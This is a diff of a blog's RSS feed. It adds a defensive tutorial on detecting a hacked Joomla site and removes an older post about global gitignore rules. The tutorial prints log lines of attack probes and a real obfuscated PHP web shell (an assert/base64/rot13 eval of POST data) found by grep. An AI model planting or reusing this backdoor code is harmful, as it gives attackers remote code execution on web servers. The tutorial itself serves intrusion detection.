@@ -6,9 +6,178 @@
 </description>
     <link>http://simpleit.rocks/</link>
     <atom:link href="http://simpleit.rocks/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Wed, 25 Jan 2017 19:00:45 +0000</pubDate>
-    <lastBuildDate>Wed, 25 Jan 2017 19:00:45 +0000</lastBuildDate>
+    <pubDate>Thu, 26 Jan 2017 15:16:30 +0000</pubDate>
+    <lastBuildDate>Thu, 26 Jan 2017 15:16:30 +0000</lastBuildDate>
     <generator>Jekyll v3.3.1</generator>
+    
+      <item>
+        <title>Find Out If Your Joomla Site Has Been Hacked</title>
+        <description>&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+
+&lt;p&gt;Like every popular Content Management System, there is always going to
+be at risk of being attacked or hacked. This article explore some
+methods to try to detect the integrity of your website.&lt;/p&gt;
+
+&lt;p&gt;Monitor your site regularly.&lt;/p&gt;
+
+&lt;h2 id=&quot;check-web-server-logs&quot;&gt;Check web server logs&lt;/h2&gt;
+
+&lt;p&gt;Check primarily for brute force attacks and attempts to upload
+files. With Apache in Ubuntu that would tipically mean to analyze
+&lt;code class=&quot;highlighter-rouge&quot;&gt;/var/log/apache2/access.log&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/log/apache2/error.log&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;For example, there is someone playing around one of my Joomla websites
+trying to explode Wordpress vulnerabilities:&lt;/p&gt;
+
+&lt;pre class=&quot;shell&quot;&gt;
+&lt;samp&gt;
+&lt;span class=&quot;shell-prompt&quot;&gt;/var/log/apache2/$&lt;/span&gt; &lt;kbd&gt;grep POST access.log&lt;/kbd&gt;
+XXXXXXXX.com:80 193.XXX.XXX.XXX - - [26/Jan/2017:00:07:03 +0000] &quot;POST /wp-content/themes/method/lib/scripts/dl-skin.php HTTP/1.1&quot; 500 363 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0&quot;
+XXXXXXXX.com:80 193.XXX.XXX.XXX - - [26/Jan/2017:00:07:14 +0000] &quot;POST /wp-content/themes/modular/lib/scripts/dl-skin.php HTTP/1.1&quot; 500 363 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0&quot;
+XXXXXXXX.com:80 193.XXX.XXX.XXX - - [26/Jan/2017:00:07:25 +0000] &quot;POST /wp-content/themes/myriad/lib/scripts/dl-skin.php HTTP/1.1&quot; 500 363 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0&quot;
+XXXXXXXX.com:80 193.XXX.XXX.XXX - - [26/Jan/2017:00:07:56 +0000] &quot;POST /wp-content/themes/persuasion/lib/scripts/dl-skin.php HTTP/1.1&quot; 500 363 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0&quot;
+&lt;/samp&gt;
+&lt;/pre&gt;
+
+&lt;h2 id=&quot;detect-modified-php-files&quot;&gt;Detect modified PHP files&lt;/h2&gt;
+
+&lt;p&gt;You can look for PHP files that were modified recently, or after some
+date you are sure didn’t perform anything to the source code.&lt;/p&gt;
+
+&lt;p&gt;That would show new possibly uploaded scripts or modified files with
+injected code in them.&lt;/p&gt;
+
+&lt;h3 id=&quot;find-files-modified-recently&quot;&gt;Find files modified recently&lt;/h3&gt;
+
+&lt;p&gt;To find recently modified files: &lt;kbd&gt;find /path/to/dir -type f -mtime -7 -ls&lt;/kbd&gt;.
+The &lt;code class=&quot;highlighter-rouge&quot;&gt;-mtime&lt;/code&gt; parameter detects when file’s data was last modified
+&lt;em&gt;n&lt;/em&gt;24* hours ago, in that case we analyze the previous 7 days.&lt;/p&gt;
+
+&lt;pre class=&quot;shell&quot;&gt;
+&lt;samp&gt;
+&lt;span class=&quot;shell-prompt&quot;&gt;$&lt;/span&gt; &lt;kbd&gt;find . -type f -mtime -7 -ls&lt;/kbd&gt;
+&lt;/samp&gt;
+&lt;/pre&gt;
+
+&lt;h3 id=&quot;find-files-modified-after-a-specific-date&quot;&gt;Find files modified after a specific date&lt;/h3&gt;
+
+&lt;p&gt;List files in given directory modified after given date &lt;kbd&gt; find
+/path/to/dir -newermt &quot;yyyy-mm-dd&quot;&lt;/kbd&gt;.&lt;/p&gt;
+
+&lt;blockquote class=&quot;blockquote&quot;&gt;
+  &lt;p&gt;-newerXY reference
+              Compares the timestamp of the current file with reference.  The reference argument is normally the name  of  a  file
+              (and  one  of its timestamps is used for the comparison) but it may also be a string describing an absolute time.  X
+              and Y are placeholders for other letters, and these letters select which time belonging to how reference is used for
+              the comparison.&lt;/p&gt;
+
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;          a   The access time of the file reference
+          B   The birth time of the file reference
+          c   The inode status change time of reference
+          m   The modification time of the file reference
+          t   reference is interpreted directly as a time
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+  &lt;footer class=&quot;blockquote-footer&quot;&gt; &lt;cite&gt;Find man page&lt;/cite&gt;&lt;/footer&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;In this example we look for files modified with the current directory
+as the base directory and modified after “2016-12-01”.&lt;/p&gt;
+
+&lt;pre class=&quot;shell&quot;&gt;
+&lt;samp&gt;
+&lt;span class=&quot;shell-prompt&quot;&gt;$&lt;/span&gt; &lt;kbd&gt;find . -newermt &quot;2017-01-25&quot; -ls&lt;/kbd&gt;
+1089538    4 drwxr-xr-x   2 marcanuy www-data     4096 Jan 25 04:13 ./website/logs
+&lt;/samp&gt;
+&lt;/pre&gt;
+
+&lt;h3 id=&quot;finding-hacked-files-with-pattern-matching&quot;&gt;Finding hacked files with pattern matching&lt;/h3&gt;
+
+&lt;p&gt;Most of the time injected code will be obfuscated, making it harder to
+look for obvious patterns, but we can try some alternatives though.&lt;/p&gt;
+
+&lt;p&gt;This code would be tipically inserted as the first line of the PHP
+file, starting with a variable, so we can look for that pattern, first
+line starting with &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;?php $&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre class=&quot;shell&quot;&gt;
+&lt;samp&gt;
+&lt;span class=&quot;shell-prompt&quot;&gt;$&lt;/span&gt; &lt;kbd&gt;grep -m 1 -r '^&lt;?php \$' .&lt;/kbd&gt;
+./website/components/com_users/views/profile/tmpl/default_params.php:&lt;?php $fields = $this-&gt;form-&gt;getFieldset('params'); ?&gt;
+./website/administrator/cache/com_ajax3j/9411v11.php:&lt;?php $coi=chr(97).chr(115).&quot;\x73&quot;.chr(101).&quot;\x72&quot;.&quot;\x74&quot;;$zioj=chr(98).chr
+(97).&quot;\x73&quot;.&quot;\x65&quot;.&quot;\x36&quot;.chr(52).&quot;\x5f&quot;.&quot;\x64&quot;.chr(101).&quot;c&quot;.&quot;\x6f&quot;.chr(100).chr(101);$jd=chr(115).&quot;\x74&quot;.chr(114).&quot;\x5f&quot;.&quot;r&quot;.chr(111)
+.&quot;\x74&quot;.&quot;1&quot;.&quot;3&quot;;@$coi(@$zioj(@$jd($_POST[chr(100).chr(97).&quot;t&quot;.chr(97)])));die(); ?&gt;
+&amp;lt;/samp&amp;gt;
+&amp;lt;/pre&amp;gt;
+
+First line of the output looks fine, but the second line looks a bit
+more than suspicious code, we can decode it and understand what it is
+doing before removing it.
+
+## Files with wrong permissions
+
+Check out for writable upload directories. The `find` command can be used to scan for files and folder with
+permission 777.
+
+&lt;pre class=&quot;shell&quot;&gt;
+&lt;span class=&quot;shell-prompt&quot;&gt;$&lt;/span&gt; &lt;kbd&gt;find . \(-type f -o -type d\) -perm 0777 -print &lt;/kbd&gt;
+&lt;/pre&gt;
+
+&amp;gt; -perm mode
+&amp;gt;               File's  permission  bits  are  exactly  mode (octal or sym‐
+&amp;gt;               bolic).  Since an exact match is required, if you  want  to
+&amp;gt;               use this form for symbolic modes, you may have to specify a
+&amp;gt;               rather complex mode string.  For example `-perm  g=w'  will
+&amp;gt;               only  match  files  which have mode 0020 (that is, ones for
+&amp;gt;               which group write permission is the only  permission  set).
+&amp;gt;               It  is more likely that you will want to use the `/' or `-'
+&amp;gt;               forms, for example `-perm -g=w',  which  matches  any  file
+&amp;gt;               with  group write permission.  See the EXAMPLES section for
+&amp;gt;               some illustrative examples.
+&amp;gt; 
+&amp;gt; &lt;footer class=&quot;blockquote-footer&quot;&gt; &lt;cite&gt;Find man page&lt;/cite&gt;&lt;/footer&gt;
+{: class=&quot;blockquote&quot;}
+
+
+Then we can modify it a bit to scan through all the 777 files on the
+server and show ones with `.php` to look for uploaded scripts:
+
+&lt;pre class=&quot;shell&quot;&gt;
+&lt;span class=&quot;shell-prompt&quot;&gt;$&lt;/span&gt; &lt;kbd&gt;find . -name &quot;*php&quot; -type f -perm 777&lt;/kbd&gt;
+&lt;/pre&gt;
+
+## Conclusion
+
+A lot of people recommends to install a clean backup after being
+hacked, this approach will fail sooner or later because you need to
+know what failed to prevent happening again.
+
+This article covers some basic strategies for identifying compromised
+files, attacks are constant with varying methods so it is important to
+know commands and strategies to recover our sites and keep them safe.
+
+## References
+
+- &amp;lt;http://www.gregfreeman.io/2013/how-to-tell-if-your-php-site-has-been-compromised/&amp;gt;
+- &amp;lt;https://www.bluebridgedev.com/hacked-joomla-files&amp;gt;
+- &amp;lt;https://www.joomshaper.com/blog/my-joomla-site-was-hacked-what-to-do&amp;gt;
+- &amp;lt;https://www.google.com/transparencyreport/safebrowsing/diagnostic/index.html&amp;gt;
+- The Joomla Hacking Compendium &amp;lt;https://www.exploit-db.com/papers/15780/&amp;gt;
+&lt;/kbd&gt;&lt;/samp&gt;&lt;/pre&gt;
+</description>
+        <pubDate>Thu, 26 Jan 2017 00:00:00 +0000</pubDate>
+        <link>http://simpleit.rocks/find-out-if-your-joomla-site-has-been-hacked/</link>
+        <guid isPermaLink="true">http://simpleit.rocks/find-out-if-your-joomla-site-has-been-hacked/</guid>
+        
+        
+        <category>docs</category>
+        
+        <category>php</category>
+        
+        <category>joomla</category>
+        
+      </item>
     
       <item>
         <title>What Are The Supported Language Highlighters In Jekyll</title>
@@ -929,7 +1098,7 @@ variables when deploying to Heroku&lt;/a&gt;.&lt;/p&gt;
       </item>
     
       <item>
-        <title>Change All Files Permissions To 644 And Directories To 755 Commands</title>
+        <title>How to change all files permissions to 644 and directories to 755</title>
         <description>&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
 
 &lt;p&gt;There are two common task in Linux environments when handling files
@@ -1189,208 +1358,6 @@ oriented to a developer user.&lt;/p&gt;
         <category>docs</category>
         
         <category>linux</category>
-        
-      </item>
-    
-      <item>
-        <title>Make Git Ignore Temporary Files Produced By Emacs And Vim In All Directories Globally</title>
-        <description>&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
-
-&lt;p&gt;Using VIm and &lt;a href=&quot;/docs/lisp/emacs/&quot;&gt;Emacs&lt;/a&gt; on a daily basis is very common for programmers.&lt;/p&gt;
-
-&lt;p&gt;They have recovering systems to avoid losing work if a computer
-crashes, that would make your directories full of strange files ending
-in &lt;code class=&quot;highlighter-rouge&quot;&gt;~&lt;/code&gt;, swap files (&lt;code class=&quot;highlighter-rouge&quot;&gt;.swp&lt;/code&gt;) or backup files named like &lt;code class=&quot;highlighter-rouge&quot;&gt;#&amp;lt;filename&amp;gt;#&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Those files would appear from time to time in your &lt;kbd&gt;git
-status&lt;/kbd&gt; listings that wouldn’t add any valuable information.&lt;/p&gt;
-
-&lt;p&gt;Better than disabling them, is to avoid seeing them globally, so any new
-&lt;code class=&quot;highlighter-rouge&quot;&gt;git&lt;/code&gt; repository won’t show them in the &lt;code class=&quot;highlighter-rouge&quot;&gt;status&lt;/code&gt; of changed file list
-but you will still be able to recover them if anything bad happens
-while editing.&lt;/p&gt;
-
-&lt;h2 id=&quot;enabling-gitignore-globally&quot;&gt;Enabling gitignore globally&lt;/h2&gt;
-
-&lt;p&gt;We will set up a global &lt;code class=&quot;highlighter-rouge&quot;&gt;.gitignore_global&lt;/code&gt; file, i.e.: a list of rules for
-ignoring files in every &lt;em&gt;Git&lt;/em&gt; repository on the computer.&lt;/p&gt;
-
-&lt;pre class=&quot;shell&quot;&gt;
-&lt;samp&gt;
-&lt;span class=&quot;shell-prompt&quot;&gt;$&lt;/span&gt; &lt;kbd&gt;git config --global core.excludesfile ~/.gitignore_global&lt;/kbd&gt;
-
-&lt;/samp&gt;
-&lt;/pre&gt;
-
-&lt;p&gt;This command will automatically set the following configuration in
-your &lt;a href=&quot;https://git-scm.com/docs/git-config#git-config-gitconfig&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;~/.gitconfig_global&lt;/code&gt;&lt;/a&gt; file.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[core]
-        excludesfile = /home/user/.gitignore_global
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;blockquote class=&quot;blockquote&quot; cite=&quot;https://git-scm.com/docs/gitignore&quot;&gt;
-  &lt;p&gt;Patterns which a user wants Git to ignore in all situations (e.g.,
-backup or temporary files generated by the user’s editor of choice)
-generally go into a file specified by core.excludesFile in the user’s
-~/.gitconfig. Its default value is $XDG_CONFIG_HOME/git/ignore. If
-$XDG_CONFIG_HOME is either not set or empty, $HOME/.config/git/ignore
-is used instead.&lt;/p&gt;
-
-  &lt;footer class=&quot;blockquote-footer&quot;&gt; &lt;cite&gt;gitignore in &lt;a href=&quot;https://git-scm.com/docs/gitignore&quot;&gt;git documentation&lt;/a&gt;&lt;/cite&gt;&lt;/footer&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;gitignore&quot;&gt;gitignore&lt;/h2&gt;
-
-&lt;p&gt;Github has a great project with useful &lt;code class=&quot;highlighter-rouge&quot;&gt;.gitignore&lt;/code&gt; files
-optimized for a Operating System and editor specific.&lt;/p&gt;
-
-&lt;p&gt;We grab the ones for Emacs and Vim (I don’t think you ever need any
-other editor ;)&lt;/p&gt;
-
-&lt;p&gt;You should put them together in a single &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.gitignore_global&lt;/code&gt; file
-that will be processed globally.&lt;/p&gt;
-
-&lt;h3 id=&quot;gitignore-for-emacs&quot;&gt;gitignore for Emacs&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://github.com/github/gitignore/blob/master/Global/Emacs.gitignore&quot;&gt;Gitignore for Emacs&lt;/a&gt; editor:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# -*- mode: gitignore; -*-
-*~
-\#*\#
-/.emacs.desktop
-/.emacs.desktop.lock
-*.elc
-auto-save-list
-tramp
-.\#*
-
-# Org-mode
-.org-id-locations
-*_archive
-
-# flymake-mode
-*_flymake.*
-
-# eshell files
-/eshell/history
-/eshell/lastdir
-
-# elpa packages
-/elpa/
-
-# reftex files
-*.rel
-
-# AUCTeX auto folder
-/auto/
-
-# cask packages
-.cask/
-dist/
-
-# Flycheck
-flycheck_*.el
-
-# server auth directory
-/server/
-
-# projectiles files
-.projectile
-
-# directory configuration
-.dir-locals.el
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;gitignore-for-vim&quot;&gt;gitignore for Vim&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://github.com/github/gitignore/blob/master/Global/Vim.gitignore&quot;&gt;Gitignore for Vim&lt;/a&gt; editor:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# swap
-[._]*.s[a-v][a-z]
-[._]*.sw[a-p]
-[._]s[a-v][a-z]
-[._]sw[a-p]
-# session
-Session.vim
-# temporary
-.netrwhist
-*~
-# auto-generated tag files
-tags
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h2 id=&quot;other-global-gitignore-properties&quot;&gt;Other global gitignore properties&lt;/h2&gt;
-
-&lt;p&gt;Other common .gitignore configurations are also available in
- Github’s &lt;a href=&quot;https://gist.github.com/octocat/9257657&quot;&gt;gist&lt;/a&gt; that may
- worth adding them to the global gitignore file:&lt;/p&gt;
-
-&lt;noscript&gt;&lt;pre&gt;# Compiled source #
-###################
-*.com
-*.class
-*.dll
-*.exe
-*.o
-*.so
-
-# Packages #
-############
-# it&amp;#39;s better to unpack these files and commit the raw source
-# git has its own built in compression methods
-*.7z
-*.dmg
-*.gz
-*.iso
-*.jar
-*.rar
-*.tar
-*.zip
-
-# Logs and databases #
-######################
-*.log
-*.sql
-*.sqlite
-
-# OS generated files #
-######################
-.DS_Store
-.DS_Store?
-._*
-.Spotlight-V100
-.Trashes
-ehthumbs.db
-Thumbs.db&lt;/pre&gt;&lt;/noscript&gt;
-&lt;script src=&quot;https://gist.github.com/octocat/9257657.js&quot;&gt; &lt;/script&gt;
-
-&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
-
-&lt;p&gt;Now every time you work in a new or old project you won’t have to deal
-with any backup files automatically generated by Vim or Emacs.&lt;/p&gt;
-
-&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Emacs 18.6.3 Recovering Data from Auto-Saves &lt;a href=&quot;https://www.gnu.org/software/emacs/manual/html_node/emacs/Recover.html&quot;&gt;https://www.gnu.org/software/emacs/manual/html_node/emacs/Recover.html&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;Vim documentation: recover &lt;a href=&quot;http://vimdoc.sourceforge.net/htmldoc/recover.html&quot;&gt;http://vimdoc.sourceforge.net/htmldoc/recover.html&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;Github gitignore project &lt;a href=&quot;https://github.com/github/gitignore/tree/master/Global&quot;&gt;https://github.com/github/gitignore/tree/master/Global&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;Gitignore file in git documentation &lt;a href=&quot;https://git-scm.com/docs/gitignore&quot;&gt;https://git-scm.com/docs/gitignore&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-</description>
-        <pubDate>Mon, 09 Jan 2017 00:00:00 +0000</pubDate>
-        <link>http://simpleit.rocks/make-git-ignore-temporary-files-produced-by-emacs-and-vim-in-all-directories-globally/</link>
-        <guid isPermaLink="true">http://simpleit.rocks/make-git-ignore-temporary-files-produced-by-emacs-and-vim-in-all-directories-globally/</guid>
-        
-        
-        <category>docs</category>
-        
-        <category>git</category>
         
       </item>
     
